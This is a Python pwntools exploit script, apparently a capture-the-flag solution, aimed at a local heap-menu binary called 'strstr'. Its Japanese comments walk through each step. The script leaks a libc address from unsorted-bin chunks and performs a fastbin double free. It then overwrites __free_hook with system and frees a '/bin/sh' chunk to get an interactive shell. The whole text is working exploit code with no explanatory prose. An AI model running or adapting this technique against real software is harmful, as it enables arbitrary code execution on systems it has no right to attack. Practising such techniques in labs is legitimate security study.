from pwn import *

elf = ELF('strstr')
context.binary = elf

s = remote('localhost', 10007)

def store(index, string):
  s.sendlineafter('command: ', '0')
  s.sendlineafter('index: ', str(index))
  s.sendlineafter('string: ', string)

def show(index):
  s.sendlineafter('command: ', '1')
  s.sendlineafter('index: ', str(index))
  return s.recvline()[:-1]

def delete(index):
  s.sendlineafter('command: ', '2')
  s.sendlineafter('index: ', str(index))

# libcのアドレスのリーク
for i in range(8):
  store(i, 'a'*0x80)
store(8, 'a')  # topとの統合を防ぐ
for i in range(8):
  delete(i)
unsort = int.from_bytes(show(7), 'little')
libcbase = unsort - (0x1ebb80+0x60)
print('libcbase:', hex(libcbase))

# サイズ0x90のチャンクを消費
for i in range(8):
  store(i, 'a'*0x80)

# fastbinでdouble free
for i in range(10):
  store(i, 'a')
for i in range(9):
  delete(i)
delete(7)

# __free_hookにsystemのアドレスを代入する
libc = ELF('libc-2.31.so')
libc.address = libcbase

for i in range(7):
  store(i, 'a')
# fastbin[0] -> storage[7] -> storage[8] -> storage[7] -> strorage[8] -> ...
store(7, pack(libc.symbols.__free_hook))
# fastbin[0] -> storage[8] -> storage[7] -> __free_hook
store(8, 'a')
store(7, 'a')
store(0, pack(libc.symbols.system))

store(0, '/bin/sh')
delete(0)

s.interactive()
